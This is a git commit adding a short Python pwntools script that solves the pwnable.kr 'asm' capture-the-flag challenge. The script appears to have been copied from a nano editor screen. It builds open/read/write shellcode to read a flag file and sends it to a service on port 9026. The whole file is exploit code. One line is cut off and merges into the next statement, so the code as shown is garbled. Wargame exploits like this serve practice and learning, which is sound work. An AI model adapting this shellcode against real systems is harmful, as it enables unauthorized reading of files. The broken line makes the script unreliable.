48a230b723b83a1b38efed656e4979dd9134000b
yoav kaplan <70645788+yoavkaplan123@users.noreply.github.com>
2024-06-03 20:22:38 +0300

    solution.py

---
+++ solution.py
@@ -0,0 +1,21 @@
+  GNU nano 2.5.3                                            File: solu.py                                                                                               
+from pwn import *
+
+context.binary = "/home/asm/asm"
+
+file_name_str = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo$length_int = 1000
+
+shellcode = asm(
+        shellcraft.open(file_name_str) +
+        shellcraft.read(3, "rsp", length_int) +
+        shellcraft.write(1, "rsp", length_int) +
+        shellcraft.exit(0)
+)
+
+p = remote('0', 9026)
+
+print(p.recv())
+p.sendline(shellcode)
+print(p.recv())
+print(p.recv())
+
